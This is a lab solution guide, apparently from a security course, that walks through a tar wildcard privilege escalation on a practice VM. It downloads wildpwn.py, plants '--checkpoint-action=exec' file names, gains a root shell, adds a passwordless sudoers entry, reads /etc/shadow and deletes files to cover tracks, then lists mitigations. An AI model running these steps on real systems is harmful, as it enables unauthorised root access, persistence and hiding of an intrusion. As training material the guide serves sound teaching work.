## Solution Guide: Exploiting `tar`

The goal of this activity is to act out the `tar` exploitation and research how to harden systems against this exploit. 

Completing this activity required the following steps: 

- Downloading `wildpwn.py` using a non-`sudo` user account. 
- Running the script to generate `.webscript`.
- Archiving the directory with `tar` to run the exploit.
- Verifying that your user can gain `sudo` access.
- Researching mitigation techniques. 

### Solutions

1. In your VM, switch to the user `jane`, and verify that you have no `sudo` privileges:

   - Run `su jane`. Use `password` as the password.

   - Run `sudo -l` to confirm that you do not have **super user** privileges.

2. Next, we'll look for automated `tar` backup files that can be exploited. 

  - As `jane`, run `cd ~/Documents`

  - Run `ls -l` to display the archive file, `jane_docs_backup.tar`.

      ```
      -rw-r--r-- 1 root root 286720 Apr 28 18:36 jane_docs_backup.tar
      ```

3. Download the [wildpwn.py](https://raw.githubusercontent.com/localh0t/wildpwn/master/wildpwn.py) attack tool to your `~/Documents/ExploitTar` directory:

   - `cd ~/Documents/ExploitTar`

   - `wget https://raw.githubusercontent.com/localh0t/wildpwn/master/wildpwn.py`

   - Check the contents of the directory before running the script with `ls -lat`:

     -rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f3
     -rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f2
     -rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f10
     -rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f1
     ```


4. Use `wildpwn.py` to generate the malicious files by running:

    - Within the `ExploitTar` directory, run `python wildpwn.py tar .` 
    
    - The output will display:

        ```
        [!] Selected payload: tar
        [+] Done! Now wait for something like: tar cf archive.tar * on ./. Good luck!
        ```

    -  Run `ls -lat` to display our new payload files:

        ```
        total 20
        drwxr-xr-x 3 jane jane 4096 Apr 28 18:41  .
        -rw-rw-r-- 1 jane jane    0 Apr 28 18:41 '--checkpoint=1'
        -rw-rw-r-- 1 jane jane    0 Apr 28 18:41 '--checkpoint-action=exec=sh .webscript'
        -rw-rw-r-- 1 jane jane  535 Apr 28 18:41  .webscript
        drwxr-xr-x 4 jane jane 4096 Apr 28 13:56  ..
        -rw-rw-r-- 1 jane jane 3699 Apr 28 13:54  wildpwn.py
        drwxr-xr-x 2 jane jane 4096 Apr 28 13:52 'important docs'
        -rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f9
        -rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f8
        ...
        ...
        ```

5. After waiting 1-2 minutes, we can re-run `ls -lat` to display that the contents of the directory have changed!

    - Run `ls -lat` to display:

      ```
      total 20
      drwxr-xr-x 4 jane jane 4096 Apr 28 18:42  .
      drwxr-xr-x 2 root root 4096 Apr 28 18:42  .cache
      drwxr-xr-x 4 jane jane 4096 Apr 28 13:56  ..
      -rw-rw-r-- 1 jane jane 3699 Apr 28 13:54  wildpwn.py
      drwxr-xr-x 2 jane jane 4096 Apr 28 13:52 'important docs'
      -rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f9
      -rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f8
      ```

    - Our exploit file should exist inside of a newly created `.cache` directory, with the name, `.cachefile`.

      - Run `cd .cache` to navigate _into_ the `.cache` directory

      - Run `ls -lat` to display the hidden `.cachefile` exploit file. 
        
        - `-l`: displays a long-list format of the files. 
        - `-a`: displays entries starting with a `.`.
        - `-t`: sorts by time modified, which we want due to the nature of this exploit.


6. While still in the `.cache` subdirectory, execute the `.cachefile` within the terminal:

   - Run `./.cachefile`  

    - You'll see your user prompt change from `jane:$` to `root:#`!


7. Add `jane` to `/etc/sudoers` so that we'll be able to run any command with superuser privileges.s `root`:

   - As `root` run `visudo` and navigate to the following section of the file:

     ```bash
     # User privilege specification
     root    ALL=(ALL:ALL) ALL
     ```

   - Under that `root` permission, add the following line and save the file:  

     ```bash
     jane   ALL=(ALL) NOPASSWD:ALL
 
   - This should allow us to run `sudo` commands as `jane` without having to enter a password.


8. Log back in as `jane` and verify that you can run commands with `sudo`. 
  
    - Run `su jane`  

    - Test your `sudo` permissions with:

        - `sudo -l`, and then

        - `sudo cat /etc/shadow` 

     - If you can see the contents of this file, you have successfully carried out a `tar wildcard attack`, turning `jane` into a superuser!

     - Due to how you edited the `visudo` entry above, you shouldn't need to enter your password for this command. Password-less `sudo` permissions allow attackers to rapidly execute elevated instructions on a target machine.

    - Remove the `ExploitTar` directory entirely to cover your tracks.

        - Run `rm -r ~/Documents/ExploitTar`


9. Ways to prevent this attack in the future include:

   - Preventing users from downloading files from untrusted sources. This will involve enforcing stricter **permissions** on where users can save files.

   - Using a tool like `tripwire` to watch the file system for suspicious changes. This will alert you whenever a user downloaded files like `wildpwn.py`, or when backups create files like `.cache/.cachefile`.
    
   - Use a tool like `lynis` to scan the system for security vulnerabilities on a regular basis. This will make it more likely that you will identify malicious files before they have a chance to damage the system.
